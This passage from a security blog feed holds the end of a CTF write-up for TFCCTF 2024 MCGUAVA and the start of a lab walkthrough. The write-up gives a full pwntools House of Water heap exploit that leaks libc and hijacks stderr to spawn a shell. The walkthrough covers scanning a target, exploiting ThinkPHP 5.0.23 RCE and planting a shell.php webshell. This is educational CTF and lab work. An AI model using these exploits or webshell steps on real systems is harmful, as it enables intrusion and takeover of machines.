已经进入到 largebin 中，并在 tcache 上踩下 libc 的地址</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/16.png" class="" title="我的图图呢"><p>现在我们的思路就非常的明确了，我的做法是先申请一个 0x110 大小的堆块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>))</span><br></pre></td></tr></table></figure><p>此时 largebin 的 fd 指针所在的位置正好是 tcache_perthread_struct 上 0x240 大小 tcache 最后一个 chunk 的存储地址，此时已经给踩上了 libc 的地址</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/17.png" class="" title="我的图图呢"><p>然后再将该地址申请出来，将地址的低 3 位改为 stdout 地址的低 3 位，爆破第 4 位，用 tcache 分配堆块到 stdout 上进而泄露出 libc 的地址，这里的爆破成功率也为 1&#x2F;16</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>)) </span><br><span class="line">add(<span class="number">0x230</span>,<span class="number">0</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219aa0</span></span><br></pre></td></tr></table></figure><p>获取 libc 地址后我们可以吧刚才申请在 tcache_perthread_struct 上的堆块释放掉再重新申请回来，然后在 tcache_perthread_struct 上存储 0x250 大小 tcache 最后一个 chunk 的地方写上 <em>IO_2_1_stderr</em>  的地址，并申请 0x250 大小的堆块在 <em>IO_2_1_stderr</em> 上写上 fake file</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">86</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="number">0x8</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>])) </span><br><span class="line"></span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>: libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line">    <span class="number">0x88</span>: libc_base + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0xa0</span>: libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]-<span class="number">0x40</span>,   <span class="comment"># _wide_data</span></span><br><span class="line">    <span class="number">0xD8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># jumptable </span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>) </span><br></pre></td></tr></table></figure><p>最后让程序通过 exit 函数退出即可执行我们的 fsop 攻击<br>下面给出完整 exp，exp 写的比较乱且注释上对堆块的标号有点不太准确，请师傅们多多包容😇</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;*&gt;&#x27;</span>,timeout = <span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index=<span class="number">0</span>,content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;how many guavas:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavset:&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavas:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guava no:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process([<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>, <span class="string">&quot;./pwn&quot;</span>],</span><br><span class="line">            env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这两个循环为多余操作，当时脑抽写的，后面懒的删了</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取 fake 0x30 和 unsorted_start 堆块的索引</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 7</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 8 fake 0x30</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 9</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 10 </span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 11</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 12 unsorted_start</span></span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x31</span>)) <span class="comment"># 13</span></span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 14</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 15 unsorted_start</span></span><br><span class="line">    add(<span class="number">0x6e0</span>) <span class="comment"># 16</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取 fake 0x20 和 unsorted_end 堆块的索引</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 17</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 18 fake 0x20</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 19</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 20</span></span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">19</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 21</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 22 unsorted_end</span></span><br><span class="line">    free(<span class="number">21</span>)</span><br><span class="line">    free(<span class="number">22</span>)</span><br><span class="line">    add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x21</span>)) <span class="comment"># 23</span></span><br><span class="line">    free(<span class="number">23</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 24</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 25 unsorted_end</span></span><br><span class="line">    add(<span class="number">0x6e0</span>) <span class="comment"># 26</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取 unsorted_middle 的索引</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 27 unsorted_middle</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 28</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 伪造 fake unsorted chunk （size、fd、bk）</span></span><br><span class="line">    add(<span class="number">0x3e8</span>) <span class="comment"># 29</span></span><br><span class="line">    add(<span class="number">0x3d8</span>) <span class="comment"># 30</span></span><br><span class="line">    free(<span class="number">29</span>)</span><br><span class="line">    free(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x30 和 unsorted_start</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">0x300</span>) <span class="comment"># 31</span></span><br><span class="line">    add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 32</span></span><br><span class="line">    add(<span class="number">0x330</span>) <span class="comment"># 33 change unsorted_start</span></span><br><span class="line">    free(<span class="number">33</span>)</span><br><span class="line">    add(<span class="number">0x1e0</span>) <span class="comment"># 34</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x20 和 unsorted_end</span></span><br><span class="line">    free(<span class="number">24</span>)</span><br><span class="line">    free(<span class="number">25</span>)</span><br><span class="line">    add(<span class="number">0x300</span>) <span class="comment"># 35</span></span><br><span class="line">    add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 36</span></span><br><span class="line">    add(<span class="number">0x340</span>) <span class="comment"># 37 change unsorted_end</span></span><br><span class="line">    free(<span class="number">37</span>)</span><br><span class="line">    add(<span class="number">0x1d0</span>) <span class="comment"># 38</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x330</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 39</span></span><br><span class="line">    free(<span class="number">39</span>) </span><br><span class="line">    add(<span class="number">0x340</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 40</span></span><br><span class="line">    free(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在后面填充堆块，并伪造 prev_size 和 size 使 fake unsorted chunk 合法</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">        add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x210</span>) <span class="comment"># 76</span></span><br><span class="line">    add(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(<span class="number">0x10000</span>)+p64(<span class="number">0x20</span>)) <span class="comment"># 77</span></span><br><span class="line">    <span class="comment"># 提前让 0x240、0x250 两个大小的堆块进入到 tcache，后面会用上</span></span><br><span class="line">    add(<span class="number">0x238</span>) <span class="comment">#78</span></span><br><span class="line">    add(<span class="number">0x248</span>) <span class="comment">#79</span></span><br><span class="line">    free(<span class="number">78</span>)</span><br><span class="line">    free(<span class="number">79</span>)</span><br><span class="line">    <span class="comment"># 依次释放 unsorted_end、unsorted_middle、unsorted_start</span></span><br><span class="line">    free(<span class="number">25</span>)</span><br><span class="line">    free(<span class="number">27</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 令 unsorted_start 的 fd 指针和 unsorted_end 的 bk 指针指向 fake unsorted chunk</span></span><br><span class="line">    add(<span class="number">0x330</span>,<span class="number">0x20</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 80</span></span><br><span class="line">    free(<span class="number">80</span>)</span><br><span class="line">    add(<span class="number">0x340</span>,<span class="number">0x28</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 81</span></span><br><span class="line">    free(<span class="number">81</span>)</span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        add(<span class="number">0x500</span>) <span class="comment"># 82</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将多余的 largebin 申请出来</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 83</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 修改</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>)) <span class="comment"># 84</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>)) <span class="comment"># 85</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add(<span class="number">0x230</span>,<span class="number">0</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\x00&#x27;</span>) <span class="comment"># 86</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    libc_base = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">        libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219aa0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hex</span>(libc_base)[<span class="number">2</span>] != <span class="string">&#x27;7&#x27;</span> <span class="keyword">or</span> <span class="built_in">hex</span>(libc_base)[<span class="number">3</span>] != <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;leak libc error&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    lg(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 释放 tcache_perthread_struct 上的堆块，使我们能够再次编辑该结构体</span></span><br><span class="line">    free(<span class="number">86</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 令 size 为 0x250 的 tcache 指向 _IO_2_1_stderr_</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">0x8</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>])) <span class="comment"># 87</span></span><br><span class="line"></span><br><span class="line">    fake_file = flat(&#123;</span><br><span class="line">        <span class="number">0x0</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">        <span class="number">0x28</span>: libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line">        <span class="number">0x88</span>: libc_base + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>,</span><br><span class="line">        <span class="number">0xa0</span>: libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]-<span class="number">0x40</span>,   <span class="comment"># _wide_data</span></span><br><span class="line">        <span class="number">0xD8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># jumptable </span></span><br><span class="line">    &#125;, filler=<span class="string">b&quot;\x00&quot;</span>) </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在 _IO_2_1_stderr_ 上写上我们的 fake file</span></span><br><span class="line">    add(<span class="number">0x240</span>,<span class="number">0</span>,fake_file)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 退出程序，执行 fsop 攻击</span></span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;cat flag.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>由于需要分别在 heapbase 和 stdout 上进行一次爆破，所以脚本执行的成功率为 1&#x2F;256，运行后还要等半天</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/18.png" class="" title="我的图图呢"><p>打通，完结散花🐂🍺</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境Initial详解</title>
      <link href="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/"/>
      <url>/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/1.png" class="" title="我的图图呢">  <h2 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h2><p>一直都知道渗透在网络安全中的重要性，可是一直都没用重视，于是在国赛决赛吃大亏。平时自己也在打打 <code>vulnhub</code>，但打的都是一些十分简单的靶场。国赛决赛结束后我就开始push校队的人去学习渗透，当然我这个新上任的队长肯定要起到带头作用，所以我也开始去练习春秋云境的靶场。很多人认为云境这个靶场比较贵，但是我认为能够用钱买知识是一件很划算的事情，而且春秋云境的靶场质量也比较高（还有国赛渗透也有很多内容来自这里面）<br>这篇文章是关于 <code>Initial</code> 这个靶机的详细讲解，这个是云境中最简单的一题，同时也是我打的第一个关于 <code>windows</code> 渗透的题目，因此学到了很多的东西。</p><h2 id="详细讲解"><a href="#详细讲解" class="headerlink" title="详细讲解"></a>详细讲解</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>题目给出了一个ip地址 <code>39.99.255.153</code>，我们可以使用 <code>nmap</code> 来看看他开启了那些端口，命令为：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 39.99.255.153</span><br></pre></td></tr></table></figure><p>这段命令是以最小速率 <code>10000</code> 对全部端口（1-65535）进行扫描，<code>10000</code> 是权衡的结果，数字过大扫描速度快，但容易遗漏端口，数字过小则扫描时间过长，经验表明 <code>10000</code> 就是扫描的合适速度。<code>-p</code> 是端口参数，<code>-p-</code> 表示对所有端口进行扫描。扫描结果如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/2.png" class="" title="我的图图呢">  <p>可以看到开启了 <code>22</code>、<code>80</code> 端口，<code>22</code> 端口是一个 <code>ssh</code> 服务，<code>80</code> 端口是一个 <code>http</code> 服务，接下来我们可以查看这个几个端口开启的服务和操作系统版本，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –sT –sV -O –p22,80 39.99.255.153</span><br></pre></td></tr></table></figure><p>其中 <code>-sT</code> 表示进行 <code>TCP</code> 扫描（三次握手），<code>-p</code> 表示待扫描的端口（后跟待扫描的端口 <code>22</code>、<code>80</code>），<code>-sV</code> 表示探测开放服务的版本，<code>-O</code> 表示探测操作系统版本，扫描结果如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/3.png" class="" title="我的图图呢">  <p>可以看到这个ip是一台 <code>ubuntu linux</code> 服务器，好像也没有什么有用的信息，想到还有一个非常好用的扫描工具 <code>fscan</code>，工具的下载地址为：<br><a href="https://github.com/shadow1ng/fscan">shadow1ng&#x2F;fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 (github.com)</a><br>这个工具有linux和windows版本，其具体用法可以看官方的文档，这里只用于进行简单的端口扫描，输入：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fscan <span class="literal">-h</span> <span class="number">39.99</span>.<span class="number">255.153</span></span><br></pre></td></tr></table></figure><p>结果如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/4.png" class="" title="我的图图呢">  <p>可以看到 <code>web server</code> 的版本是 <code>ThinkPHP 5.0.23</code>，而且存在漏洞！！！<br>当然也可以使用<code>nmap</code>命令来进行漏洞扫描，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p22,80 39.99.255.153</span><br></pre></td></tr></table></figure><p>这里使用 <code>ThinkphpGUI</code> 这个开源工具来进行扫一下，工具链接为：<br><a href="https://github.com/Lotus6/ThinkphpGUI">Lotus6&#x2F;ThinkphpGUI: Thinkphp(GUI)漏洞利用工具，支持各版本TP漏洞检测，命令执行，getshell。 (github.com)</a><br>输入 <code>url</code> 和选择版本后点击检测和 <code>GetShell</code> 即可，结果如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/5.png" class="" title="我的图图呢">  <p>可以到网页存在一个后门，还有一个漏洞利用的 <code>poc</code>，我们利用他给的 <code>poc</code> 来写入 <code>shell.php</code> 后门</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/6.png" class="" title="我的图图呢">  <p>好像也没有什么回显，于是我们直接使用蚁剑来连他自带的后门：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/7.png" class="" title="我的图图呢">  <img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/8.png" class="" title="我的图图呢">  <p>成功连接，而且我们能看见当前目录下有一个 <code>shell.php</code> 文件</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/9.png" class="" title="我的图图呢">  <p>点开可以发现其就是我们利用 <code>poc</code> 上传的后门，不过问题不大，能进来就行，接下来就是需要提取，我们先看一下自己是什么权限：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/10.png" class="" title="我的图图呢">  <p>可以看见是 <code>www-data</code> 权限，可是输入 <code>sudo -l</code> 时回显</p><blockquote><p>(root) NOPASSWD: 